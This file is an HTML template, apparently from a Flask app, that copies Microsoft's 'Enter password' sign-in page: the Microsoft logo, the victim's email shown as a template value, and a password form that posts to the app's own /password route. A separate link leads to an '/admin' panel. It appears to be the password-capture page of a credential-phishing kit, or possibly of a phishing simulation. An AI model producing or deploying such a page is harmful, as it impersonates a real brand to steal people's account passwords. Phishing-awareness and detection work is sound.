<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter password</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
</head>
<body>
    <div class="wrapper">

        <div class="card">

            <div class="ms-logo">
                <svg width="21" height="21" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
                    <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
                    <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
                    <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
                    <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
                </svg>
                <span>Microsoft</span>
            </div>

            <h1 class="heading">Enter password</h1>

            <div class="email-pill">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                    <circle cx="8" cy="8" r="8" fill="#c8c8c8"/>
                    <circle cx="8" cy="6.5" r="3" fill="#888"/>
                    <ellipse cx="8" cy="14" rx="5" ry="3.5" fill="#888"/>
                </svg>
                <span>{{ email }}</span>
            </div>

            <form method="POST" action="/password">

                <div class="input-group">
                    <input
                        type="password"
                        id="password"
                        name="password"
                        class="input-field"
                        placeholder="Password"
                        autocomplete="off"
                        required
                    />
                </div>

                {% if error %}
                <p class="input-error">{{ error }}</p>
                {% endif %}

                <div class="links">
                    <a href="#">Forgot password?</a>
                </div>

                <div class="btn-group">
                    <button type="button" class="btn btn-back" onclick="window.location.href='/'">Back</button>
                    <button type="submit" class="btn btn-next">Sign in</button>
                </div>

            </form>

        </div>

        <div class="card sign-in-options">
            <span>🔑</span>
            <a href="#">Sign-in options</a>
        </div>

        <div style="text-align:center; padding: 10px;">
            <a href="/admin" style="font-size:12px; color:#888; text-decoration:none;">Admin Panel</a>
        </div>

    </div>
</body>
</html>
